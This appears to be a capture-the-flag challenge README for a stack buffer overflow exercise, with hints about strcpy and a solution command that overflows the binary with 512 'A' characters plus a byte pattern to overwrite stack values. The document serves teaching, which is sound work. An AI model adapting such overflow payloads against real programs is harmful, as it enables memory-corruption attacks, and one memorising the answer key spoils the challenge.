Challenge 3 - 80 Points
========================
Simple buffer overflow to overwite values on the stack.

Must compile with -fno-stack-protector

Hints
-----
1. Strcpy is involved. It's awful.

2. You're gonna need a bigger string.

Solution
--------
./chal3 $(python -c 'print "A"*512 + "\xad\xda\xad\xda\xdd\xee\xee\xdd"')
